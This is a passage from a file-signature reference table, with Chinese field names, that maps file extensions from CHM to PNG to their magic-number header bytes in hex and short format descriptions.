{“扩展名”:”CHM”,”文件头标识（HEX）”:”495453”,”文件描述”:””},<br>    {“扩展名”:”CLB”,”文件头标识（HEX）”:”434D5831”,”文件描述”:”CorelBinarymetafile”},<br>    {“扩展名”:”CLB”,”文件头标识（HEX）”:”434F4D2B”,”文件描述”:”COM+Catalogfile”},<br>    {“扩展名”:”cnt”,”文件头标识（HEX）”:”3A42617365”,”文件描述”:””},<br>    {“扩展名”:”COM,DLL,DRV,EXE,PIF,QTS,QTX,SYS”,”文件头标识（HEX）”:”4D5A”,”文件描述”:”Windows&#x2F;DOSexecutablefile”},<br>    {“扩展名”:”COM”,”文件头标识（HEX）”:”4D5AEE”,”文件描述”:””},<br>    {“扩展名”:”COM”,”文件头标识（HEX）”:”E93B03”,”文件描述”:””},<br>    {“扩展名”:”CPE”,”文件头标识（HEX）”:”464158434F5645522D564552”,”文件描述”:”MicrosoftFaxCoverSheet”},<br>    {“扩展名”:”CPL”,”文件头标识（HEX）”:”4D5A”,”文件描述”:”Controlpanelapplication”},<br>    {“扩展名”:”CPT”,”文件头标识（HEX）”:”4350543746494C45”,”文件描述”:”CorelPhotopaintfile”},<br>    {“扩展名”:”CPT”,”文件头标识（HEX）”:”43505446494C45”,”文件描述”:”CorelPhotopaintfile”},<br>    {“扩展名”:”CPX”,”文件头标识（HEX）”:”5B5769”,”文件描述”:””},<br>    {“扩展名”:”cru;crush”,”文件头标识（HEX）”:”4352555348”,”文件描述”:”CRUSHArchiveFile”},<br>    {“扩展名”:”CRU”,”文件头标识（HEX）”:”43525553482076”,”文件描述”:”Crushcompressedarchive”},<br>    {“扩展名”:”CRW”,”文件头标识（HEX）”:”49491A00000048454150434344520200”,”文件描述”:”CanondigitalcameraRAWfile”},<br>    {“扩展名”:”CTF”,”文件头标识（HEX）”:”436174616C6F6720332E303000”,”文件描述”:”WhereIsItCatalogfile”},<br>    {“扩展名”:”CUR”,”文件头标识（HEX）”:”0000020001002020”,”文件描述”:”Windowscursorfile”},<br>    {“扩展名”:”dat”,”文件头标识（HEX）”:3,”文件描述”:”MapInfoNativeDataFormat”},<br>    {“扩展名”:”dat”,”文件头标识（HEX）”:”1A52545320434F4D5052455353454420494D4147452056312E301A”,”文件描述”:”RuntimeSoftwarediskimage”},<br>    {“扩展名”:”dat”,”文件头标识（HEX）”:”415647365F496E746567726974795F4461746162617365”,”文件描述”:”AVG6Integritydatabasefile”},<br>    {“扩展名”:”DAT”,”文件头标识（HEX）”:”43524547”,”文件描述”:”Windows9xregistryhive”},<br>    {“扩展名”:”DAT”,”文件头标识（HEX）”:”436C69656E742055726C4361636865204D4D462056657220”,”文件描述”:”IEHistoryDATfile”},<br>    {“扩展名”:”DAT”,”文件头标识（HEX）”:”45524653534156454441544146494C45”,”文件描述”:”KrollEasyRecoverySavedRecoveryStatefile”},<br>    {“扩展名”:”DAT”,”文件头标识（HEX）”:”496E6E6F20536574757020556E696E7374616C6C204C6F6720286229”,”文件描述”:”InnoSetupUninstallLogfile”},<br>    {“扩展名”:”db”,”文件头标识（HEX）”:”0006156100000002000004D200001000”,”文件描述”:”NetscapeNavigator(v4)databasefile”},<br>    {“扩展名”:”DB”,”文件头标识（HEX）”:”44424648”,”文件描述”:”PalmZirephotodatabase”},<br>    {“扩展名”:”db”,”文件头标识（HEX）”:8,”文件描述”:”dBASEIVordBFastconfigurationfile”},<br>    {“扩展名”:”db3”,”文件头标识（HEX）”:3,”文件描述”:”dBASEIIIfile”},<br>    {“扩展名”:”db4”,”文件头标识（HEX）”:4,”文件描述”:”dBASEIVdatafile”},<br>    {“扩展名”:”dba”,”文件头标识（HEX）”:”00014244”,”文件描述”:”PalmDateBookArchivefile”},<br>    {“扩展名”:”dbx”,”文件头标识（HEX）”:”CFAD12FE”,”文件描述”:””},<br>    {“扩展名”:”dbx”,”文件头标识（HEX）”:”CFAD12FEC5FD746F”,”文件描述”:”OutlookExpress”},<br>    {“扩展名”:”dci”,”文件头标识（HEX）”:”3C21646F63747970”,”文件描述”:”AOLHTMLmailfile”},<br>    {“扩展名”:”dcx”,”文件头标识（HEX）”:”3ADE68B1”,”文件描述”:”DCXGraphicFile”},<br>    {“扩展名”:”DDB”,”文件头标识（HEX）”:”000100”,”文件描述”:””},<br>    {“扩展名”:”dib”,”文件头标识（HEX）”:”424D”,”文件描述”:”device-independentbitmapimage”},<br>    {“扩展名”:”DLL”,”文件头标识（HEX）”:”4D5A90”,”文件描述”:””},<br>    {“扩展名”:”DMP”,”文件头标识（HEX）”:”4D444D5093A7”,”文件描述”:”Windowsminidumpfile”},<br>    {“扩展名”:”DMS”,”文件头标识（HEX）”:”444D5321”,”文件描述”:”AmigaDiskMashercompressedarchive”},<br>    {“扩展名”:”doc”,”文件头标识（HEX）”:”0D444F43”,”文件描述”:”DeskMateDocumentfile”},<br>    {“扩展名”:”doc”,”文件头标识（HEX）”:”1234567890FF”,”文件描述”:”MSWord6.0”},<br>    {“扩展名”:”doc”,”文件头标识（HEX）”:”31BE000000AB0000”,”文件描述”:”MSWordforDOS6.0”},<br>    {“扩展名”:”doc”,”文件头标识（HEX）”:”7FFE340A”,”文件描述”:”MSWord”},<br>    {“扩展名”:”dot;ppt;xla;ppa;pps;pot;msi;sdw;db”,”文件头标识（HEX）”:”D0CF11E0”,”文件描述”:”MSOffice&#x2F;OLE2”},<br>    {“扩展名”:”doc;dot;xls;xlt;xla;ppt;apr;ppa;pps;pot;msi;sdw;db”,”文件头标识（HEX）”:”D0CF11E0A1B11AE1”,”文件描述”:”MSCompoundDocumentv1orLotusApproachAPRfile”},<br>    {“扩展名”:”DPL”,”文件头标识（HEX）”:”4D5A50”,”文件描述”:””},<br>    {“扩展名”:”DRV”,”文件头标识（HEX）”:”4D5A16”,”文件描述”:””},<br>    {“扩展名”:”drw”,”文件头标识（HEX）”:7,”文件描述”:”Acommonsignatureandfileextensionformanydrawingprograms.”},<br>    {“扩展名”:”drw”,”文件头标识（HEX）”:”01FF02040302”,”文件描述”:”Micrografxvectorgraphicfile”},<br>    {“扩展名”:”ds4”,”文件头标识（HEX）”:”4D47582069747064”,”文件描述”:”MicrografixDesigner4”},<br>    {“扩展名”:”DSN”,”文件头标识（HEX）”:”4D56”,”文件描述”:”CDStomperProlabelfile”},<br>    {“扩展名”:”dsp”,”文件头标识（HEX）”:”23204D6963726F736F667420446576656C6F7065722053747564696F”,”文件描述”:”MicrosoftDeveloperStudioprojectfile”},<br>    {“扩展名”:”dss”,”文件头标识（HEX）”:”02647373”,”文件描述”:”DigitalSpeechStandard(Olympus,Grundig,&amp;Phillips)”},<br>    {“扩展名”:”dtd”,”文件头标识（HEX）”:”0764743264647464”,”文件描述”:”DesignTools2DDesignfile”},<br>    {“扩展名”:”dtd”,”文件头标识（HEX）”:”3C21454E54495459”,”文件描述”:”XMLDTD”},<br>    {“扩展名”:”DVR”,”文件头标识（HEX）”:”445644”,”文件描述”:”DVR-Studiostreamfile”},<br>    {“扩展名”:”dwg”,”文件头标识（HEX）”:”414331”,”文件描述”:””},<br>    {“扩展名”:””,”文件头标识（HEX）”:”41433130”,”文件描述”:”GenericAutoCADdrawing”},<br>    {“扩展名”:””,”文件头标识（HEX）”:””,”文件描述”:”NOTESonAutoCADfileheaders:The0x41-43-31-30(AC10)isagenericheader,occupyingthefirstfourbytesinthefile.Thenexttwobytesgivefurtherindicationabouttheversionorsubtype:”},<br>    {“扩展名”:””,”文件头标识（HEX）”:””,”文件描述”:”0x30-32(02)—AutoCADR2.5”},<br>    {“扩展名”:””,”文件头标识（HEX）”:””,”文件描述”:”0x30-33(03)—AutoCADR2.6”},<br>    {“扩展名”:””,”文件头标识（HEX）”:””,”文件描述”:”0x30-34(04)—AutoCADR9”},<br>    {“扩展名”:””,”文件头标识（HEX）”:””,”文件描述”:”0x30-36(06)—AutoCADR10”},<br>    {“扩展名”:””,”文件头标识（HEX）”:””,”文件描述”:”0x30-39(09)—AutoCADR11&#x2F;R12”},<br>    {“扩展名”:””,”文件头标识（HEX）”:””,”文件描述”:”0x31-30(10)—AutoCADR13(subtype10)”},<br>    {“扩展名”:””,”文件头标识（HEX）”:””,”文件描述”:”0x31-31(11)—AutoCADR13(subtype11)”},<br>    {“扩展名”:””,”文件头标识（HEX）”:””,”文件描述”:”0x31-32(12)—AutoCADR13(subtype12)”},<br>    {“扩展名”:””,”文件头标识（HEX）”:””,”文件描述”:”0x31-33(13)—AutoCADR14(subtype13)”},<br>    {“扩展名”:””,”文件头标识（HEX）”:””,”文件描述”:”0x31-34(14)—AutoCADR14(subtype14)”},<br>    {“扩展名”:””,”文件头标识（HEX）”:””,”文件描述”:”0x31-35(15)—AutoCADR2000”},<br>    {“扩展名”:””,”文件头标识（HEX）”:””,”文件描述”:”0x31-38(18)—AutoCADR2004”},<br>    {“扩展名”:””,”文件头标识（HEX）”:””,”文件描述”:”0x32-31(21)—AutoCADR2007”},<br>    {“扩展名”:”Enn(wherennarenumbers)”,”文件头标识（HEX）”:”455646”,”文件描述”:”EnCaseevidencefile”},<br>    {“扩展名”:”ECO”,”文件头标识（HEX）”:”2A5052”,”文件描述”:””},<br>    {“扩展名”:”elf”,”文件头标识（HEX）”:”7F454C4601010100”,”文件描述”:”ELFExecutable”},<br>    {“扩展名”:”emf”,”文件头标识（HEX）”:”0100000058000000”,”文件描述”:”Extended(Enhanced)WindowsMetafileFormat,printerspoolfile”},<br>    {“扩展名”:”eml”,”文件头标识（HEX）”:”44656C69766572792D646174653A”,”文件描述”:”Email”},<br>    {“扩展名”:”EML”,”文件头标识（HEX）”:”46726F6D202020”,”文件描述”:”Acommmonfileextensionfore-mailfiles.SignaturesshownhereareforNetscape,Eudora,andagenericsignature,respectively.EMLisalsousedbyOutlookExpressandQuickMail.”},<br>    {“扩展名”:”EML”,”文件头标识（HEX）”:”46726F6D203F3F3F”,”文件描述”:”Acommmonfileextensionfore-mailfiles.SignaturesshownhereareforNetscape,Eudora,andagenericsignature,respectively.EMLisalsousedbyOutlookExpressandQuickMail.”},<br>    {“扩展名”:”EML”,”文件头标识（HEX）”:”46726F6D3A20”,”文件描述”:”Acommmonfileextensionfore-mailfiles.SignaturesshownhereareforNetscape,Eudora,andagenericsignature,respectively.EMLisalsousedbyOutlookExpressandQuickMail.”},<br>    {“扩展名”:”EML”,”文件头标识（HEX）”:”526563”,”文件描述”:””},<br>    {“扩展名”:”enc”,”文件头标识（HEX）”:”005C41B1FF”,”文件描述”:”MujahideenSecrets2encryptedfile”},<br>    {<br>        “扩展名”: “enl”,<br>        “文件头标识（HEX）”: “[32byteoffset] 40 40 40 20 00 00 40 40 40 40”,<br>        “文件描述”: “EndNote Library File”<br>    },<br>    {“扩展名”:”eps”,”文件头标识（HEX）”:”25215053”,”文件描述”:”AdobeEPSFile”},<br>    {“扩展名”:”eps”,”文件头标识（HEX）”:”252150532D41646F6265”,”文件描述”:”Postscript”},<br>    {“扩展名”:”eps”,”文件头标识（HEX）”:”252150532D41646F62652D332E3020455053462D332030”,”文件描述”:”AdobeencapsulatedPostScriptfile(Ifthissignatureisnotattheimmediatebeginningofthefile,itwilloccurearlyinthefile,commonlyatbyteoffset30)”},<br>    {“扩展名”:”EPS”,”文件头标识（HEX）”:”C5D0D3”,”文件描述”:””},<br>    {“扩展名”:”eth”,”文件头标识（HEX）”:”1A350100”,”文件描述”:”GNNettestWinPharoahcapturefile”},<br>    {“扩展名”:”evt”,”文件头标识（HEX）”:”300000004C664C65”,”文件描述”:”WindowsEventViewerfile”},<br>    {“扩展名”:”evt”,”文件头标识（HEX）”:”03000000C466C456”,”文件描述”:””},<br>    {“扩展名”:”EVTX”,”文件头标识（HEX）”:”456C6646696C6500”,”文件描述”:”WindowsVistaeventlogfile”},<br>    {“扩展名”:”exe;dll;drv;vxd;sys;ocx;vbx”,”文件头标识（HEX）”:”4D5A”,”文件描述”:”Win32Executable”},<br>    {“扩展名”:”exe;dll;drv;vxd;sys;ocx;vbx”,”文件头标识（HEX）”:”4D5A”,”文件描述”:”Win16Executable”},<br>    {“扩展名”:”exe;com;386;ax;acm;sys;dll;drv;flt;fon;ocx;scr;lrc;vxd;cpl;x32”,”文件头标识（HEX）”:”4D5A”,”文件描述”:”ExecutableFile”},<br>    {“扩展名”:”EXE,DLL,OCX,OLB,IMM,IME”,”文件头标识（HEX）”:”4D5A90”,”文件描述”:””},<br>    {“扩展名”:”fli”,”文件头标识（HEX）”:”0011AF”,”文件描述”:”FLICAnimationfile”},<br>    {“扩展名”:”flt”,”文件头标识（HEX）”:”000101”,”文件描述”:”OpenFlight3Dfile”},<br>    {“扩展名”:”FLT”,”文件头标识（HEX）”:”4D5A900003000000”,”文件描述”:”Auditiongraphicfilterfile(Adobe)”},<br>    {“扩展名”:”FLV”,”文件头标识（HEX）”:”464C5601”,”文件描述”:”Flashvideofile”},<br>    {“扩展名”:”fm”,”文件头标识（HEX）”:”3C4D616B657246696C6520”,”文件描述”:”AdobeFrameMakerfile”},<br>    {“扩展名”:”fm3”,”文件头标识（HEX）”:”00001A0007800100”,”文件描述”:”Lotus123v3FMTfile”},<br>    {“扩展名”:”fmt”,”文件头标识（HEX）”:”20006800200”,”文件描述”:”Lotus123v4FMTfile”},<br>    {“扩展名”:”FNT”,”文件头标识（HEX）”:”434841”,”文件描述”:””},<br>    {“扩展名”:”FON”,”文件头标识（HEX）”:”4D5A”,”文件描述”:”Fontfile”},<br>    {“扩展名”:”GBC”,”文件头标识（HEX）”:”87F53E”,”文件描述”:””},<br>    {“扩展名”:”gid”,”文件头标识（HEX）”:”3F5F0300”,”文件描述”:”WindowsHelpIndexFile”},<br>    {“扩展名”:”GID”,”文件头标识（HEX）”:”4C4E0200”,”文件描述”:”WindowsHelpindexfile”},<br>    {“扩展名”:”GIF”,”文件头标识（HEX）”:”47494638”,”文件描述”:””},<br>    {“扩展名”:”gif”,”文件头标识（HEX）”:”474946383761”,”文件描述”:”Graphicsinterchangeformatfile(GIF87A)”},<br>    {“扩展名”:”gif”,”文件头标识（HEX）”:”474946383961”,”文件描述”:”Graphicsinterchangeformatfile(GIF89A)”},<br>    {“扩展名”:”GTD”,”文件头标识（HEX）”:”7B5072”,”文件描述”:””},<br>    {“扩展名”:”GX2”,”文件头标识（HEX）”:”475832”,”文件描述”:”ShowPartnergraphicsfile(notconfirmed)”},<br>    {“扩展名”:”gz;tar;tgz”,”文件头标识（HEX）”:”1F8B”,”文件描述”:”GzipArchiveFile”},<br>    {“扩展名”:”gz;tgz”,”文件头标识（HEX）”:”1F8B08”,”文件描述”:”GZCompressedFile”},<br>    {“扩展名”:”hap”,”文件头标识（HEX）”:”91334846”,”文件描述”:”HAPArchiveFile”},<br>    {“扩展名”:”HDMP”,”文件头标识（HEX）”:”4D444D5093A7”,”文件描述”:”Windowsheapdumpfile”},<br>    {“扩展名”:”hdr”,”文件头标识（HEX）”:”233F52414449414E43450A”,”文件描述”:”adianceHighDynamicRangeimagefile”},<br>    {“扩展名”:”HLP”,”文件头标识（HEX）”:”3F5F03”,”文件描述”:””},<br>    {“扩展名”:”hlp”,”文件头标识（HEX）”:”3F5F0300”,”文件描述”:”WindowsHelpfile”},<br>    {“扩展名”:”HLP”,”文件头标识（HEX）”:”4C4E0200”,”文件描述”:”WindowsHelpfile”},<br>    {<br>        “扩展名”: “hlp”,<br>        “文件头标识（HEX）”: “[7byteoffset] 00 00 FF FF FF FF”,<br>        “文件描述”: “Windows Help file”<br>    },<br>    {“扩展名”:”hqx”,”文件头标识（HEX）”:”28546869732066696C65”,”文件描述”:”MacintoshBinHex4CompressedArchive”},<br>    {“扩展名”:”hqx”,”文件头标识（HEX）”:”28546869732066696C65206D75737420626520636F6E76657274656420776974682042696E48657820”,”文件描述”:”MacintoshBinHex4CompressedArchive”},<br>    {“扩展名”:”HTM”,”文件头标识（HEX）”:”3C2144”,”文件描述”:””},<br>    {“扩展名”:”htm;html”,”文件头标识（HEX）”:”3C21444F4354”,”文件描述”:”HyperTextMarkupLanguage3”},<br>    {“扩展名”:”htm;html”,”文件头标识（HEX）”:”3C48544D4C3E”,”文件描述”:”HyperTextMarkupLanguage2”},<br>    {“扩展名”:”htm;html”,”文件头标识（HEX）”:”3C68746D6C3E”,”文件描述”:”HyperTextMarkupLanguage1”},<br>    {“扩展名”:”html”,”文件头标识（HEX）”:”68746D6C3E”,”文件描述”:”HTML”},<br>    {“扩展名”:”ico”,”文件头标识（HEX）”:”0000010000”,”文件描述”:”IconFile”},<br>    {“扩展名”:”ico”,”文件头标识（HEX）”:”0000010001002020”,”文件描述”:”IconFile”},<br>    {“扩展名”:”IFF”,”文件头标识（HEX）”:”464F524D”,”文件描述”:””},<br>    {“扩展名”:”IFO”,”文件头标识（HEX）”:”445644”,”文件描述”:”DVDinfofile”},<br>    {“扩展名”:”IME”,”文件头标识（HEX）”:”4D5A90”,”文件描述”:””},<br>    {“扩展名”:”img”,”文件头标识（HEX）”:”000100080001000101”,”文件描述”:”VenturaPublisher&#x2F;GEMVDIImageFormatBitmapfile”},<br>    {“扩展名”:”IMG”,”文件头标识（HEX）”:”00FFFF”,”文件描述”:””},<br>    {“扩展名”:”IMM”,”文件头标识（HEX）”:”4D5A90”,”文件描述”:””},<br>    {“扩展名”:”ind”,”文件头标识（HEX）”:”414F4C494458”,”文件描述”:”AOLclientpreferences&#x2F;settingsfile(MAIN.IND)”},<br>    {“扩展名”:”ISO”,”文件头标识（HEX）”:”4344303031”,”文件描述”:”ISO-9660CDDiscImage(Thissignatureusuallyoccursatbyte8001,8801,or9001.)”},<br>    {“扩展名”:”ivr”,”文件头标识（HEX）”:”2E524543”,”文件描述”:”RealPlayervideofile(V11andlater)”},<br>    {“扩展名”:”JAR”,”文件头标识（HEX）”:”4A4152435300”,”文件描述”:”JARCScompressedarchive”},<br>    {“扩展名”:”jar”,”文件头标识（HEX）”:”5F27A889”,”文件描述”:”JARArchiveFile”},<br>    {“扩展名”:”jpg;jpeg”,”文件头标识（HEX）”:”FFD8FF”,”文件描述”:””},<br>    {“扩展名”:”jpg;jpe;jpeg”,”文件头标识（HEX）”:”FFD8FFE000”,”文件描述”:”JPGGraphicFile”},<br>    {“扩展名”:”jpg;jpe;jpeg”,”文件头标识（HEX）”:”FFD8FFFE00”,”文件描述”:”JPGGraphicFile”},<br>    {“扩展名”:”KGB”,”文件头标识（HEX）”:”4B47425F61726368202D”,”文件描述”:”KGBarchive”},<br>    {“扩展名”:”KOZ”,”文件头标识（HEX）”:”49443303000000”,”文件描述”:”SprintMusicStoreaudiofile(formobiledevices)”},<br>    {“扩展名”:”LDB”,”文件头标识（HEX）”:”42494C”,”文件描述”:””},<br>    {“扩展名”:”lha”,”文件头标识（HEX）”:”2D6C68352D”,”文件描述”:”LHACompressed”},<br>    {<br>        “扩展名”: “lha; lzh”,<br>        “文件头标识（HEX）”: “[2byteoffset] 2D 6C 68”,<br>        “文件描述”: “Compressed archive file”<br>    },<br>    {“扩展名”:”LHP”,”文件头标识（HEX）”:”3F5F03”,”文件描述”:””},<br>    {“扩展名”:”lhp”,”文件头标识（HEX）”:”3F5F0300”,”文件描述”:”WindowsHelpFile”},<br>    {“扩展名”:”lib”,”文件头标识（HEX）”:”213C617263683E0A”,”文件描述”:”Unixarchiver(ar)filesandMicrosoftProgramLibraryCommonObjectFileFormat(COFF)”},<br>    {“扩展名”:”LIB”,”文件头标识（HEX）”:”2A2420”,”文件描述”:””},<br>    {“扩展名”:”LIT”,”文件头标识（HEX）”:”49544F4C49544C53”,”文件描述”:”MicrosoftReadereBookfile”},<br>    {“扩展名”:”LNK”,”文件头标识（HEX）”:”4C0000”,”文件描述”:””},<br>    {“扩展名”:”lnk”,”文件头标识（HEX）”:”4C000000”,”文件描述”:”WindowsShortcut(LinkFile)”},<br>    {“扩展名”:”lnk”,”文件头标识（HEX）”:”4C000000011402”,”文件描述”:”WindowsLinkFile”},<br>    {“扩展名”:”LNK”,”文件头标识（HEX）”:”4C00000001140200”,”文件描述”:”Windowsshortcutfile”},<br>    {“扩展名”:”log”,”文件头标识（HEX）”:”2A2A2A2020496E7374616C6C6174696F6E205374617274656420”,”文件描述”:”SymantecWiseInstallerlogfile”},<br>    {“扩展名”:”lzh”,”文件头标识（HEX）”:”lh”,”文件描述”:”Lzcompressionfile”},<br>    {“扩展名”:”lwp”,”文件头标识（HEX）”:”576F726450726F”,”文件描述”:”LotusWordProv9”},<br>    {“扩展名”:”m3u”,”文件头标识（HEX）”:”234558”,”文件描述”:””},<br>    {“扩展名”:”m4a”,”文件头标识（HEX）”:”00000020667479704D34412000000000”,”文件描述”:”AppleLosslessAudioCodecfile”},<br>    {“扩展名”:”m4a;m4v”,”文件头标识（HEX）”:”00000020667479704D34412000000000”,”文件描述”:”QuickTimeM4A&#x2F;M4Vfile”},<br>    {“扩展名”:”manifest”,”文件头标识（HEX）”:”3C3F786D6C2076657273696F6E3D”,”文件描述”:”WindowsVisualStylesheetXMLfile”},<br>    {“扩展名”:”MAR”,”文件头标识（HEX）”:”4D41523100”,”文件描述”:”Mozillaarchive”},<br>    {“扩展名”:”MAR”,”文件头标识（HEX）”:”4D415243”,”文件描述”:”Microsoft&#x2F;MSNMARCarchive”},<br>    {“扩展名”:”MAR”,”文件头标识（HEX）”:”4D41723000”,”文件描述”:”MArcompressedarchive”},<br>    {“扩展名”:”max”,”文件头标识（HEX）”:”D0CF11”,”文件描述”:””},<br>    {“扩展名”:”mdb”,”文件头标识（HEX）”:”000100005374616E64617264204A6574204442”,”文件描述”:”MicrosoftAccessfile”},<br>    {“扩展名”:”mdb;mda;mde;mdt”,”文件头标识（HEX）”:”5374616E64617264204A”,”文件描述”:”MSAccess”},<br>    {“扩展名”:”MDF”,”文件头标识（HEX）”:”00FFFF”,”文件描述”:””},<br>    {“扩展名”:”mdf”,”文件头标识（HEX）”:”00FFFFFFFFFFFFFFFFFFFF0000020001”,”文件描述”:”Alcohol120%CDimage”},<br>    {“扩展名”:”mdf”,”文件头标识（HEX）”:”010F0000”,”文件描述”:”MicrosoftSQLServer2000database”},<br>    {“扩展名”:”MDI”,”文件头标识（HEX）”:”4550”,”文件描述”:”MicrosoftDocumentImagingfile”},<br>    {“扩展名”:”MDS”,”文件头标识（HEX）”:”4D4544”,”文件描述”:””},<br>    {“扩展名”:”MID;MIDI”,”文件头标识（HEX）”:”4D546864”,”文件描述”:”MusicalInstrumentDigitalInterface(MIDI)soundfile”},<br>    {“扩展名”:”mkv”,”文件头标识（HEX）”:”1A45DFA3934282886D6174726F736B61”,”文件描述”:”Matroskastreamfile”},<br>    {“扩展名”:”MLS”,”文件头标识（HEX）”:”4D494C4553”,”文件描述”:”Milestonesv1.0projectmanagementandschedulingsoftware(Alsosee&quot;MV2C&quot;and&quot;MV214&quot;signatures)”},<br>    {“扩展名”:”MLS”,”文件头标识（HEX）”:”4D4C5357”,”文件描述”:”Skypelocalizationdatafile”},<br>    {“扩展名”:”MLS”,”文件头标识（HEX）”:”4D56323134”,”文件描述”:”Milestonesv2.1bprojectmanagementandschedulingsoftware(Alsosee&quot;MILES&quot;and&quot;MV2C&quot;signatures)”},<br>    {“扩展名”:”MLS”,”文件头标识（HEX）”:”4D563243”,”文件描述”:”Milestonesv2.1aprojectmanagementandschedulingsoftware(Alsosee&quot;MILES&quot;and&quot;MV214&quot;signatures)”},<br>    {“扩展名”:”MMF”,”文件头标识（HEX）”:”4D4D4D440000”,”文件描述”:”YamahaCorp.SyntheticmusicMobileApplicationFormat(SMAF)formultimediafilesthatcanbeplayedonhand-helddevices.”},<br>    {“扩展名”:”mny”,”文件头标识（HEX）”:”000100004D534953414D204461746162617365”,”文件描述”:”MicrosoftMoneyfile”},<br>    {“扩展名”:”MOV”,”文件头标识（HEX）”:”00000F”,”文件描述”:””},<br>    {“扩展名”:”MOV”,”文件头标识（HEX）”:”000077”,”文件描述”:””},<br>    {“扩展名”:”mov”,”文件头标识（HEX）”:”6D6F6F76”,”文件描述”:”Quicktime”},<br>    {“扩展名”:”mov”,”文件头标识（HEX）”:”6D646174”,”文件描述”:”QuickTimeMovie”},<br>    {“扩展名”:”mp”,”文件头标识（HEX）”:”0CED”,”文件描述”:”MonochromePictureTIFFbitmapfile(unconfirmed)”},<br>    {“扩展名”:”MP3”,”文件头标识（HEX）”:”494433”,”文件描述”:”MPEG-1AudioLayer3(MP3)audiofile”},<br>    {“扩展名”:”MP3”,”文件头标识（HEX）”:”FFFB50”,”文件描述”:””},<br>    {“扩展名”:”mp4”,”文件头标识（HEX）”:”000000186674797033677035”,”文件描述”:”MPEG-4videofiles”},<br>    {“扩展名”:”MPA”,”文件头标识（HEX）”:”000001”,”文件描述”:””},<br>    {“扩展名”:”mpg;mpeg”,”文件头标识（HEX）”:”000001B3”,”文件描述”:”MPEGMovie”},<br>    {“扩展名”:”mpg”,”文件头标识（HEX）”:”000001BA”,”文件描述”:”MPEG”},<br>    {“扩展名”:”MSC”,”文件头标识（HEX）”:”3C3F78”,”文件描述”:””},<br>    {“扩展名”:”msc”,”文件头标识（HEX）”:”3C3F786D6C2076657273696F6E3D22312E30223F3E0D0A3C4D4D435F436F6E736F6C6546696C6520436F6E736F6C6556657273696F6E3D22”,”文件描述”:”MicrosoftManagementConsoleSnap-inControlfile”},<br>    {“扩展名”:”msi”,”文件头标识（HEX）”:”2320”,”文件描述”:”Cerius2file”},<br>    {“扩展名”:”MSV”,”文件头标识（HEX）”:”4D535F564F494345”,”文件描述”:”SonyMemoryStickCompressedVoicefile”},<br>    {“扩展名”:”NES”,”文件头标识（HEX）”:”4E4553”,”文件描述”:””},<br>    {“扩展名”:”NLS”,”文件头标识（HEX）”:”C22020”,”文件描述”:””},<br>    {“扩展名”:”nri”,”文件头标识（HEX）”:”0E4E65726F49534F”,”文件描述”:”NeroCDCompilation”},<br>    {“扩展名”:”ntf”,”文件头标识（HEX）”:”1A0000”,”文件描述”:”LotusNotesdatabasetemplate”},<br>    {“扩展名”:”nsf;ntf”,”文件头标识（HEX）”:”1A0000030000”,”文件描述”:”LotusNotesDatabase&#x2F;Template”},<br>    {“扩展名”:”nsf”,”文件头标识（HEX）”:”1A00000300001100”,”文件描述”:”NotesDatabase”},<br>    {“扩展名”:”nsf”,”文件头标识（HEX）”:”1A0000040000”,”文件描述”:”LotusNotesdatabase”},<br>    {“扩展名”:”ntf”,”文件头标识（HEX）”:”30314F52444E414E43452053555256455920202020202020”,”文件描述”:”NationalTransferFormatMapFile”},<br>    {“扩展名”:”obj”,”文件头标识（HEX）”:”4C01”,”文件描述”:”MicrosoftCommonObjectFileFormat(COFF)relocatableobjectcodefileforanIntel386orlater&#x2F;compatibleprocessors”},<br>    {“扩展名”:”OCX”,”文件头标识（HEX）”:”4D5A”,”文件描述”:”ActiveXorOLECustomControl”},<br>    {“扩展名”:”OCX”,”文件头标识（HEX）”:”4D5A90”,”文件描述”:””},<br>    {“扩展名”:”OLB”,”文件头标识（HEX）”:”4D5A”,”文件描述”:”OLEobjectlibrary”},<br>    {“扩展名”:”OLB”,”文件头标识（HEX）”:”4D5A90”,”文件描述”:””},<br>    {“扩展名”:”org;pfc”,”文件头标识（HEX）”:”414F4C564D313030”,”文件描述”:”AOLpersonalfilecabinet(PFC)file”},<br>    {“扩展名”:”pak”,”文件头标识（HEX）”:”1A0B”,”文件描述”:”Compressedarchivefile”},<br>    {“扩展名”:”PAT”,”文件头标识（HEX）”:”4746315041544348”,”文件描述”:”AdvancedGravisUltrasoundpatchfile”},<br>    {“扩展名”:”PAT”,”文件头标识（HEX）”:”47504154”,”文件描述”:”GIMP(GNUImageManipulationProgram)patternfile”},<br>    {“扩展名”:”PBK”,”文件头标识（HEX）”:”5B4144”,”文件描述”:””},<br>    {“扩展名”:”PCB”,”文件头标识（HEX）”:”17A150”,”文件描述”:””},<br>    {“扩展名”:”PCS”,”文件头标识（HEX）”:”0A0501”,”文件描述”:””},<br>    {“扩展名”:”pcx”,”文件头标识（HEX）”:”0Ann0101”,”文件描述”:”ZSOFTPaintbrushfile(wherenn&#x3D;0x02,0x03,or0x05)”},<br>    {“扩展名”:”pcx”,”文件头标识（HEX）”:”0A050108”,”文件描述”:”PCPaintbrush(oftenassociatedwithQuakeEnginegames)”},<br>    {<br>        “扩展名”: “pdb”,<br>        “文件头标识（HEX）”: “[11byteoffset] 00 00 00 00 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00 00 00 00 00”,<br>        “文件描述”: “Palmpilot Database&#x2F;Document File”<br>    },<br>    {“扩展名”:”PDF”,”文件头标识（HEX）”:”255044”,”文件描述”:””},<br>    {“扩展名”:”pdf;fdf”,”文件头标识（HEX）”:”25504446”,”文件描述”:”AdobePortableDocumentFormatandFormsDocumentfile”},<br>    {“扩展名”:”pdf”,”文件头标识（HEX）”:”255044462D312E”,”文件描述”:”AdobeAcrobat”},<br>    {“扩展名”:”PDG”,”文件头标识（HEX）”:”484802”,”文件描述”:””},<br>    {“扩展名”:”pf”,”文件头标识（HEX）”:”1100000053434341”,”文件描述”:”Windowsprefetchfile”},<br>    {“扩展名”:”pic”,”文件头标识（HEX）”:”0100000001”,”文件描述”:”Unknowntypepicturefile”},<br>    {“扩展名”:”PJT”,”文件头标识（HEX）”:”000007”,”文件描述”:””},<br>    {“扩展名”:”PLL”,”文件头标识（HEX）”:”24536F”,”文件描述”:””},<br>    {“扩展名”:”PNG”,”文件头标识（HEX）”:”89504E”,”文件描述”:””},<br>    {“扩展名”:”PNG”,”文件头标识（HEX）”:”89504E47”,”文件描述”:””},<br>    {“扩展名”:”png”,”文件头标识（HEX）”:”89504E470D0A”,”文件描述”:”PNGImageFile”},<br>    {“扩展名”:”png”,”文件头标识（HEX）”:”89504E470D0A1A0A”,”文件描述”:”PNGImageFile”},<br>    